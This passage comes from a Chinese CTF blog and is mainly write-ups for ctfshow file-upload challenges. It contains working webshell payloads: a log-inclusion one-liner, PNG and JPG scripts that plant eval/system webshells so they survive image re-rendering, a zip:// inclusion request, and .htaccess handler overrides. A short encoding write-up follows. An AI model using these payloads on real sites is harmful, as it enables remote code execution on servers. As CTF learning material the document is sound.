<p><strong>.user.ini（文件包含）—&gt; 上传1.png（rce，可控）—&gt; /upload/index.php 攻击</strong></p>
<p>但是当我们对文件内容进行较为严格的过滤时，我们可以考虑在<code>1.png</code>时继续文件包含，将<code>rce</code>的内容转移到新的文件中，于是我们重写<code>1.png</code>文件上传的内容。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/n&#x27;</span>.<span class="string">&#x27;ginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在日志中写入我们的一句话木马，成功实现<code>rce</code>。</p>
<h3 id="web161（文件头检查绕过）"><a href="#web161（文件头检查绕过）" class="headerlink" title="web161（文件头检查绕过）"></a>web161（文件头检查绕过）</h3><p>这道题我们基本套路的和payload都和web160一致，但是需要在上传文件时，将文件头改为<code>GIF89a</code>，这是GIF文件头。</p>
<h3 id="web164（PNG文件渲染）"><a href="#web164（PNG文件渲染）" class="headerlink" title="web164（PNG文件渲染）"></a>web164（PNG文件渲染）</h3><p>这道题我们首先上传一个普通的文件，发现能够查看，观察到<code>url</code>后有文件名，暗示有文件包含的漏洞。</p>
<p>尝试了<code>GIF89a</code>文件头，返回报错说只支持<code>PNG</code>，但是直接<code>PNG</code>打进去，看起来没什么可以过滤的点（这里附上后来打出来的源代码）。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件大小不超1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查content-type头</span></span><br><span class="line">    	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = pathinfo(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$ext_suffix</span>, <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>)))&#123;</span><br><span class="line">                <span class="comment">//二次渲染png图片，随意的图片马会被清洗</span></span><br><span class="line">                <span class="variable">$png</span> = imagecreatefrompng(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$png</span>==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$dst</span> = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                    imagepng(<span class="variable">$png</span>,<span class="variable">$dst</span>);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;只支持PNG&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    		<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$ret</span>);<span class="keyword">echo</span> json_encode(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure>
<p>逃避<code>PNG</code>二次渲染的手段有两种，一个是修改<code>CRC</code>值，另一个是修改数据段，这里附上国外大佬给的脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./insert_data.png&#x27;</span>);</span><br><span class="line"><span class="comment">//payload = <span class="meta">&lt;?=</span>$_GET[0]($_POST[1]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>图片传上去后，利用抓包重放这样就可以拿到想要的数据了。</p>
<h3 id="web165（JPG渲染绕过）"><a href="#web165（JPG渲染绕过）" class="headerlink" title="web165（JPG渲染绕过）"></a>web165（JPG渲染绕过）</h3><p>jpg图片二次渲染</p>
<p>注意：jpg图片易损，所以图片马制作失败的概率不小，纯纯看运气了</p>
<p>（推荐先渲染一次，然后再在渲染过的图片上搞图片马）。</p>
<p>附上脚本和用法，基本上都看得懂了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php ./exp.php a.jpg</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="web166（zip伪协议读取）"><a href="#web166（zip伪协议读取）" class="headerlink" title="web166（zip伪协议读取）"></a>web166（zip伪协议读取）</h3><p>前端打开，只要<code>zip</code>，考虑使用<code>zip</code>或者<code>phar</code>伪协议</p>
<p>直接把包上传，在<code>download.php</code>那里完成文件包含</p>
<p>需要注意的是，文件上传的时候，要修改一下文件类型</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-zip-compressed</span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload/download.php?file=zip://59efade1276a2f4b6629781e65a2d409.zip%231.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>193087d3-0d5f-4ade-bc63-8959ef28b865.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://193087d3-0d5f-4ade-bc63-8959ef28b865.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="ini"><span class="attr">1</span>=system(<span class="string">&#x27;ls ../&#x27;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure>
<p>这样就成功打进去了。</p>
<h3 id="web167（-htaccess解析）"><a href="#web167（-htaccess解析）" class="headerlink" title="web167（.htaccess解析）"></a>web167（.htaccess解析）</h3><p>一直打，有点累了。主要讲讲思路吧。</p>
<ol>
<li>打开前端，看看要传什么文件</li>
<li>传个普通jpg，返回来可以直接读取，没有直接的文件包含点</li>
<li>传个普通jpg图片马，竟然直接过了，说明不检查文件头和文件内容</li>
<li>改个PHP，phtml看看，PHP被ban了，phtml无法解析</li>
<li>看看.user.ini有没办法来搞一哈，发现还是不行，对应目录下没有php文件</li>
<li>这些都寄了，这些考虑一下解析漏洞了，打一个<code>.htaccess</code>进去，这下过了</li>
</ol>
<p>附上<code>.htaccess</code>的payload吧</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">//法一</span><br><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">//法二</span><br><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>当<code>flag</code>存在的文件不是<code>PHP</code>文件，我们也可以直接利用类似<code>.user.ini</code>的方法来做</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file &#x27;flag&#x27;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>upload</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF-单表替换密码-wp</title>
    <url>/2022/04/28/blog0018-NSSCTF-%E5%8D%95%E8%A1%A8%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81-wp/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>NSSCTF-常用编码-wp</title>
    <url>/2022/04/28/blog0017-NSSCTF-%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81-wp/</url>
    <content><![CDATA[<h2 id="零、写在前面"><a href="#零、写在前面" class="headerlink" title="零、写在前面"></a>零、写在前面</h2><p>编码这种东西太多了，这次其实主要是学习一下<code>base</code>编码的一些东西</p>
<span id="more"></span>
<h4 id="SWPUCTF-2021-crypto7（md5）"><a href="#SWPUCTF-2021-crypto7（md5）" class="headerlink" title="[SWPUCTF 2021]crypto7（md5）"></a>[SWPUCTF 2021]crypto7（md5）</h4><p>编码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">69f</span>7906323b4f7d1e4e972acf4abfbfc</span><br></pre></td></tr></table></figure>
<p>全部为16进制的数字，但是显然有几个不是在ASCII范围内，应该不是16进制转换。</p>
<p>观察发现长度为32，意味着可能是MD5编码，尝试使用MD5在线解密。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.cmd5.com/</span><br></pre></td></tr></table></figure>
<p>得到结果。</p>
<h4 id="SWPUCTF-2021-crypto8（ciphey）"><a href="#SWPUCTF-2021-crypto8（ciphey）" class="headerlink" title="[SWPUCTF 2021]crypto8（ciphey）"></a>[SWPUCTF 2021]crypto8（ciphey）</h4><p>编码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">73E-30</span>U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`</span><br></pre></td></tr></table></figure>
<p>答案是<code>Uuencode</code>，不过我们可以直接工具一把子过了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m ciphey -t &#x27;73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`&#x27;</span><br></pre></td></tr></table></figure>
<p>直接拿到答案</p>
<h4 id="AFCTF-2018-BASE（base循环编码）"><a href="#AFCTF-2018-BASE（base循环编码）" class="headerlink" title="[AFCTF 2018]BASE（base循环编码）"></a>[AFCTF 2018]BASE（base循环编码）</h4><p>这道题给了一个很大的文件，我拿出第一行，发现反复在<code>base64/32/16</code>中解码，这显然直接求助于Python脚本</p>
<p>我最开始写了一个基于异常处理的，后来看到Xenny大佬的脚本，觉得很好，这里附上：</p>
